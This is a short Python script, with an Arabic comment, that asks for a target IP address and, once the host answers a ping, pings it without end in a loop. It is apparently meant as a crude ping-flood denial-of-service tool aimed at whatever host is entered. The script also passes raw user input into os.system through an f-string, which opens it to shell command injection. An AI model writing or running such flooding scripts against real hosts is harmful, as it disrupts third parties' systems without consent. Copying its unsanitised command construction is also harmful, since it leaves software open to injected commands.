import os
import time

target_ip = input("Enter the target IP address: ")

while True:
    response = os.system(f"ping -n 1 {target_ip}")
    if response == 0:
        while True:
            os.system(f"ping -n 60000 {target_ip} > nul")
            time.sleep(1)  # انتظر 1 ثانية قبل تكرار عملية ال ping مرة أخرى
    else:
        print("No response from the specified IP address.")